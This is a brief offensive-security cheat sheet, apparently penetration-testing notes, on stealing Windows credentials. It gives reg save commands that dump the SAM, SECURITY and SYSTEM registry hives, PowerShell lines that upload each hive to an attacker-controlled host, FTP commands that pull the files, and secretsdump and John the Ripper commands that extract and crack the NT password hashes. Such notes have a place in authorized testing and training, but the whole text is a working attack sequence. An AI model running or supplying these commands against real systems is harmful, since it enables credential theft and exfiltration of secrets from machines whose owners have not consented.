# SAM / SYSTEM / SECURITY

```text
reg save hklm\sam sam.save
reg save hklm\security security.save
reg save hklm\system system.save
```

```text
powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','sam.save')
powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','security.save')
powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','system.save')
```

```text
$ ftp $TARGET
ftp> bin
200 Type set to I.

ftp> get sam.save
ftp> get security.save
ftp> get system.save
```

```text
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > dump.hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt dump.hash --format=NT
sudo john --show --format=NT dump.hash
```



